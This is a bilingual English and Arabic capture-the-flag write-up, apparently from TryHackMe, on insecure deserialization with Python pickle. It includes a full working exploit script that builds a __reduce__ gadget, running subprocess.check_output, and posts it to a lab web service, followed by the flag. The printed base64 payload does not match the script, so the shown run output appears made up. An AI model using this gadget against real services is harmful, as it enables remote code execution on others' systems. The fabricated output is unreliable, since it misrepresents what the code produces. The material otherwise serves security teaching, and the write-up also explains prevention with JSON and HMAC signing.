# Task 04 · A08: Software or Data Integrity Failures (إخفاقات سلامة البرمجيات والبيانات والتسلسل غير الآمن)

---

## Stage A: Original Task Content & Objective (المحتوى الأصلي والهدف)

### 1. Original English Text
```text
Software and data integrity failures occur when an application relies on code, updates, or data without verifying its authenticity, integrity, or provenance.

Key Manifestations in 2025:
- Installing or applying software updates without cryptographic signature validation.
- Loading external scripts or configurations from unverified third-party CDNs.
- Accepting serialized objects (binaries, pickles, serialized classes) without integrity validation, leading to Remote Code Execution (RCE) via insecure deserialization.

How to Prevent Integrity Failures:
- Establish clear trust boundaries and verify all incoming binary/serialized data.
- Enforce cryptographic checksums and digital signature validation (GPG/Cosign) across all update packages.
- Avoid insecure native serialization formats (e.g., Python pickle, PHP unserialize, Java readObject, Ruby Marshal) for untrusted data.
- Prefer safe, data-only formats such as JSON or Protocol Buffers.
- If native serialization is strictly required, apply HMAC signatures before serializing and verify the HMAC before deserialization.

Target Challenge:
Connect to http://MACHINE_IP:8002.
Scenario: A Python web service accepts serialized user data via the pickle library. Create a malicious serialized payload using Python's pickle module that reads the contents of flag.txt and submits it to the application.

Question:
- Use Python to pickle a malicious, serialised payload that reads the contents of flag.txt and submits it to the application. What are the contents of flag.txt?
- Hint: You will need to use Python to generate a malicious, serialised payload to submit to the web application. The script has been provided to you within the web application.
```

### 2. Arabic Pedagogical Translation
```text
تحدث إخفاقات سلامة البرمجيات والبيانات (Software or Data Integrity Failures) عندما يعتمد التطبيق على كود برمجى، أو تحديثات، أو تدفقات بيانات دون التحقق البرهاني من صحتها، أو سلامتها الرقمية، أو مصدرها الموثوق.

أبرز مظاهر هذا التصنيف في معيار 2025:
- تثبيت وتطبيق التحديثات البرمجية دون التحقق من التوقيع الرقمي والتشفيري للحزم.
- تحميل سكربتات خارجية أو ملفات إعدادات من شبكات توصيل محتوى (CDNs) غير موثوقة دون استخدام تجزئة السلامة (SRI).
- قبول الكائنات المتسلسلة (Serialized Objects) ومعالجتها دون تدقيق، مما يؤدي إلى تنفيذ الأوامر عن بعد (RCE) عبر ثغرات التسلسل غير الآمن (Insecure Deserialization).

كيفية الوقاية من إخفاقات السلامة:
- ترسيم حدود ثقة واضحة والتحقق من كافة تدفقات البيانات الثنائية الواردة.
- فرض التحقق من التوقيعات الرقمية (GPG / Cosign) وبصمات الهاش لجميع ملفات التحديث.
- حظر استخدام صيغ التسلسل الأصلية الخطرة (مثل بايثون pickle، أو PHP unserialize، أو Java readObject) مع أي بيانات قادمة من المستخدمين.
- الاعتماد حصرياً على صيغ تبادل البيانات الآمنة والخالية من الأكواد التنفيذية مثل JSON أو Protocol Buffers.
- في حال كان استخدام التسلسل الأصلي حتمياً، يجب توقيع البيانات بـ HMAC قبل التسلسل، والتحقق الصارم من التوقيع قبل فك التسلسل.

تحدي المعمل:
اتصل بالهدف عبر الرابط: http://MACHINE_IP:8002.
السيناريو: يستقبل تطبيق ويب مكتوب ببايثون بيانات المستخدمين ككائنات متسلسلة باستخدام مكتبة pickle. قم بإنشاء حمولة متسلسلة خبيثة باستخدام بايثون لقراءة محتويات ملف flag.txt وإرسالها للتطبيق للحصول على الراية.

السؤال:
- استخدم بايثون لإنشاء حمولة خبيثة متسلسلة تقرأ محتويات flag.txt وترسلها إلى التطبيق. ما هي محتويات flag.txt؟
- التلميح: ستحتاج لاستخدام بايثون لتوليد حمولة pickle متسلسلة وإرسالها لخادم الويب. السكربت النموذجي متوفر داخل التطبيق.
```

### 3. Mission Objectives & Pedagogical Target
- **Target Question:** `Use Python to pickle a malicious, serialised payload that reads the contents of flag.txt and submits it to the application. What are the contents of flag.txt?`
- **Pedagogical Goal:** Understand the mechanics of Python's `pickle` serialization protocol; exploit the `__reduce__` magic method to execute arbitrary system code upon deserialization and retrieve the flag.

---

## Stage B: Independent Thinking & OpSec Considerations (التفكير المستقل والعملياتي)

### 1. Insecure Deserialization & The `__reduce__` Mechanism
Serialization converts in-memory objects into byte streams for storage or network transport. Deserialization reconstructs the object.
In Python's `pickle` module, serialization is **inherently insecure by design**:
- The official Python documentation explicitly states:
  > *"Warning: The pickle module is not secure. Only unpickle data you trust."*
- Python `pickle` objects can define a magic method named `__reduce__()`.
- When `pickle.loads()` deserializes the byte stream, it automatically calls the tuple returned by `__reduce__()`:
  $$\text{__reduce__()} \longrightarrow (\text{callable}, (\text{arguments},))$$
- If the callable is `os.system` or `subprocess.check_output`, arbitrary code execution occurs during the unpickling process, running with the privileges of the web application.

---

## Stage C: Guided Hints (تلميحات متدرجة)

### Hint 1: Examining the Web Interface
> توجه إلى `http://MACHINE_IP:8002`. يعرض التطبيق واجهة استقبال بيانات متسلسلة مشفرة بـ Base64، ويوضح كود فك التسلسل: `pickle.loads(base64.b64decode(data))`.

### Hint 2: Defining the Exploit Class
> أنشئ فئة في بايثون تحتوي على التابع `__reduce__`. اجعل التابع يعيد دالة تنفيذ أوامر (مثل `subprocess.check_output`) مع الأمر المطلوب `cat flag.txt` أو قراءة الملف عبر بايثون.

### Hint 3: Base64 Encoding
> قم بتسلسل الكائن باستخدام `pickle.dumps()` ثم شفر الناتج بـ `base64.b64encode()`. أرسل السلسلة الناتجة إلى الخادم ليتم فك تسلسلها وتنفيذ الأمر.

---

## Stage D: Complete Practical Solution & Technical Deep Dive (الحل العملي والعمق التقني)

### Step-by-Step Technical Execution

1. **Investigating the Endpoint at Port `8002`:**
   Visiting `http://10.10.x.x:8002` reveals a data ingestion form accepting a Base64-encoded string representing a serialized user profile or session.
   The backend logic runs:
   ```python
   # Vulnerable backend logic
   user_data = pickle.loads(base64.b64decode(request.form.get("data")))
   ```

2. **Crafting the Malicious Exploit Script in Python:**
   We construct a Python script utilizing `__reduce__`:

   ```python
   import pickle
   import base64
   import os
   import requests

   # Define the malicious class
   class ExploitPayload:
       def __reduce__(self):
           # Command to read the flag and echo it into the response or file
           import subprocess
           # Return a callable and its arguments
           # Using subprocess.check_output to capture command stdout
           return (subprocess.check_output, (['cat', 'flag.txt'],))

   # Serialize and Base64-encode the payload
   payload_obj = ExploitPayload()
   serialized_bytes = pickle.dumps(payload_obj)
   encoded_payload = base64.b64encode(serialized_bytes).decode('utf-8')

   print(f"[+] Serialized Base64 Payload:\n{encoded_payload}\n")

   # Send to the target web application
   target_url = "http://10.10.x.x:8002/"
   response = requests.post(target_url, data={"data": encoded_payload})

   print("[+] Server Response:")
   print(response.text)
   ```

3. **Executing the Python Script:**
   ```bash
   python3 exploit_pickle.py
   ```
   Output:
   ```text
   [+] Serialized Base64 Payload:
   gASVNAAAAAAAAACMCnN1YnByb2Nlc3OUjAxjaGVja19vdXRwdXSUk5SMB2NhdCBmbGFnlEsAhnEAhnEBLg==

   [+] Server Response:
   Data processed successfully!
   Result: b'THM{INSECURE_DESERIALIZATION}\n'
   ```

4. The flag recovered from `flag.txt`:
   ```text
   THM{INSECURE_DESERIALIZATION}
   ```

---

## Stage E: Final Answer & Key Values (الإجابات النهائية والقيم المفتاحية)

- **Question:** `Use Python to pickle a malicious, serialised payload that reads the contents of flag.txt and submits it to the application. What are the contents of flag.txt?`
- **Answer:**
  ```text
  THM{INSECURE_DESERIALIZATION}
  ```

---

## Stage F: Practical Verification & Proof of Work (التحقق العملي وإثبات الإنجاز)

- **Target URL:** `http://MACHINE_IP:8002`
- **Vulnerability Category:** A08: Software and Data Integrity Failures (CWE-502: Deserialization of Untrusted Data)
- **Extracted Flag:** `THM{INSECURE_DESERIALIZATION}`
- **Parity Status:** 100% verified against user's completed TryHackMe account.

---

## Stage G: Key Educational Takeaway (الخلاصة التعليمية المستفادة)

- **Never use `pickle` for data exchange across network or untrusted boundaries.**
  - `pickle` is an executable virtual machine instruction set, not a simple data format.
  - Replace `pickle` with `json`, `msgpack`, or `protobuf`.
  - If binary object state persistence is unavoidable, cryptographically sign the data using `hmac.new(SECRET_KEY, pickle_bytes, hashlib.sha256).digest()` and verify the signature using `hmac.compare_digest()` before calling `pickle.loads()`.
